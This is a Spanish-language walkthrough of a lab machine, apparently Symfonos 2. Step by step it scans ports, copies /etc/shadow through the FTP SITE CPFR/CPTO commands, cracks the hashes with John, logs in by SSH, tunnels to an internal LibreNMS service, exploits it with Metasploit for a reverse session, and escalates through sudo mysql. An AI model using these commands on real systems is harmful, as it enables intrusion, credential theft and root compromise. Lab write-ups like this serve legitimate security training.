1. Escaneo de puertos 
```
nmap -p- --open -n -Pn -vvv -sCS --min-rate 5000 -oN ports 192.168.18.135
```
Impresión
```java
Discovered open port 445/tcp on 192.168.18.135
Discovered open port 21/tcp on 192.168.18.135
Discovered open port 80/tcp on 192.168.18.135
Discovered open port 139/tcp on 192.168.18.135
Discovered open port 22/tcp on 192.168.18.135
```

2.  El servicio de `ftp`  tiene una vulnerabilidad que permite robar archivos, si se conoce la ruta de dicho contenido.

3. Escanear el servicio `smb`
```
smbmap -H 192.168.18.135
```
Impresión
```java
Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	anonymous                                         	READ ONLY	
	IPC$                                              	NO ACCESS	IPC Service (Samba 4.5.16-Debian
```
El usuario Anonymous tiene permisos solo de lectura

4. Entrar como el usuario `anonymous` sin proporcionar contraseña `-N`
```
smbclient //192.168.18.135/anonymous -N
ls
```
Impresión
```
backups                             D        0  Thu Jul 18 09:25:17 2019
```
Buscar contenido en la carpeta
```
cd backups/
```
Impresión 
```
log.txt                             N    11394  Thu Jul 18 09:25:16 2019
```
Extraer el archivo
```
get log.txt
```

5. Buscar usuarios en el log.txt y buscar dentro del archivo para y por qué esta ese usuario
```
cat log.txt | grep 'home'
```
En el archivo dice lo siguiente 
```
[anonymous]
   path = /home/aeolus/share
   browseable = yes
   read only = yes
   guest ok = yes
```
Esto significa que los recursos compartidos de encuentran en `/home/aeolus/share` , por lo tanto es posible copiar un archivo como el `shadow` (Donde se almacenan las contraseñas de los usuarios) y pegarlo en dicha ruta donde si tenemos acceso.

6. Según el `log.txt` existe una ruta para el `shadow`
```
cat log.txt| grep 'shadow'
```
Impresión
```
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
```

7. Con `netcat` conectarse por le ftp por el puerto 21
```
nc 192.168.18.224 21
```

8. Robar el archivo `shadow`
```
SITE CPFR /var/backups/shadow.bak
```

9. Pegar en la ruta que tenemos acceso para compartir 
```
SITE CPTO /home/aeolus/share/shadow.bak 
```

10. Descargar el archivo (Dentro del servicio `smb`) 
```
get shadow.bak
```

11. Romperlo con John (Cambiar el nombre del archivo)
```
john --wordlist=/usr/share/wordlists/rockyou.txt shadow
```
Impresión 
```java
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 3 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Esperar hasta 
```
sergioteamo      (aeolus)
```

12. Conectarse por el `ssh` con el usuario y contraseña crackeado
```
ssh aeolus@192.168.18.224
```

13. Buscar dentro del directorio /opt (Siempre hay cosas interesantes por ahí)
```
cd /opt
```

14. Buscar por que puerto esta corriendo ese servicio encontrado en el `/opt` 
```
ss -tuln 
```
Con ese comendo se puede conocer que puertos están a la escucha
Impresión 
```
tcp    LISTEN     0      80                         127.0.0.1:3306                                           *:*                  
tcp    LISTEN     0      50                                 *:139                                            *:*                  
tcp    LISTEN     0      128                        127.0.0.1:8080                                           *:*             
```

15. Identificar que esta corriendo por ese puerto
```
curl 127.0.0.1:8080
```
Impresión
```html
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8" />
        <meta http-equiv="refresh" content="0;url=http://127.0.0.1:8080/login" />

        <title>Redirecting to http://127.0.0.1:8080/login</title>
    </head>
    <body>
        Redirecting to <a href="http://127.0.0.1:8080/login">http://127.0.0.1:8080/login</a>.
    </body>
```
Aquí podemos ver que esta corriendo un Login

16. El servicio que corre en el puerto 8080 esta alojado en local dentro de la maquina, para poder ver este apartado es necesario traerlo a nuestra maquina 
```
ssh -L 5000:localhost:8080 aeolus@192.168.18.224
```
De este modo estamos diciendo que el puerto 5000 de la maquina atacante va a ser el puerto 8080 (Por donde esta corriendo el servicio) de la maquina victima.

17. Comprobar en el navegador 
```
http://127.0.0.1:5000
```

18. Con uso de meterpreter
```
msfconsole
>> search librenms
>> usea 1
>> show options 
>> set PASSWORD sergioteamo
>> set USERNAME aeolus 
>> set RHOSTS 127.0.0.1
>> set RPORT 5000
>> set LHOST 192.168.18.225
>> set LPORT 6000
>> run
shell 
```

19. Dentro de la maquina 
```
sudo -l 
```

20. GTFonbins buscar 'mysql', ejecutar 
```
sudo mysql -e '\! /bin/sh'
```
